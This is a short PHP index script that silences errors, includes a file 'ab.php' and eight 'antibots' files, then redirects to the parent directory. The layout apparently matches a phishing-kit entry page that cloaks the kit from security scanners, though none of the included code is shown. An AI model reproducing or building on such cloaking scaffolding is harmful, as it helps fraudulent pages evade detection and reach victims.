<?php
session_start();
error_reporting(0);
include('ab.php');
include('antibots1.php');
include('antibots2.php');
include('antibots3.php');
include('antibots4.php');
include('antibots5.php');
include('antibots6.php');
include('antibots7.php');
include('antibots8.php');
header("location: ../");
?>
